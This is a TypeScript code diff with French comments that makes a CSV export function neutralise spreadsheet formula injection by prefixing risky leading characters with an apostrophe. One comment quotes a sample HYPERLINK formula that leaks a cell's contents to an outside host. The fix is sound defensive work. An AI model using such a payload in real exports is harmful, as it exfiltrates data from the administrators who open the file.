@@ -27,8 +27,30 @@
  *     toutes les colonnes suivantes, en silence ;
  *   - **le BOM** : sans lui, Excel lit le fichier dans l'encodage de la
  *     machine et « Prefecture » devient « PrÃ©fecture ». C'est le meme BOM
- *     que l'import tolere a la lecture — ici on l'ecrit expres.
+ *     que l'import tolere a la lecture — ici on l'ecrit expres ;
+ *   - **la premiere lettre** : voir `CARACTERES_FORMULE` plus bas. Un numero
+ *     de telephone guineen commence par `+224`, et Excel le lit comme une
+ *     formule.
  */
+
+/**
+ * Les caracteres par lesquels Excel decide qu'une cellule est une formule.
+ *
+ * Trouve sur un vrai export : `+224620000300` arrivait dans le tableur comme
+ * `224620000300`, l'indicatif mange en silence. Excel evalue la cellule, et
+ * les guillemets n'y changent rien.
+ *
+ * **Le meme defaut se laisse armer.** Un nom de produit saisi au comptoir
+ * comme `=HYPERLINK("http://ailleurs/?"&A1;"cliquez")` s'executerait chez
+ * l'administrateur qui exporte la liste, avec ses droits et ses donnees : le
+ * tableur devient le vecteur. On neutralise a l'ecriture, une fois, pour les
+ * quatre exports qui passent par ici — journal d'audit compris.
+ *
+ * L'apostrophe de tete est la marque « ceci est du texte » que le tableur
+ * comprend ; la valeur reste entiere et relisible, au prix d'un caractere
+ * visible dans la cellule. Perdre un indicatif telephonique coute plus cher.
+ */
+const CARACTERES_FORMULE = ['=', '+', '-', '@', '\t', '\r'];
 
 /** Le separateur par defaut : celui qu'Excel en francais attend. */
 export const SEPARATEUR_CSV = ';';
@@ -46,8 +68,15 @@ export const BOM_UTF8 = '﻿';
  */
 export function champCsv(valeur: unknown, separateur = SEPARATEUR_CSV): string {
   if (valeur === null || valeur === undefined) return '';
-  const texte = valeur instanceof Date ? valeur.toISOString() : String(valeur);
-  if (texte === '') return '';
+  const brut = valeur instanceof Date ? valeur.toISOString() : String(valeur);
+  if (brut === '') return '';
+
+  // Un nombre reste un nombre : il n'a pas de tete dangereuse, et l'apostrophe
+  // le transformerait en texte, donc insommable dans le tableur.
+  const texte =
+    typeof valeur !== 'number' && CARACTERES_FORMULE.includes(brut[0]!)
+      ? `'${brut}`
+      : brut;
 
   const doitEtreEntoure =
     texte.includes(separateur) ||
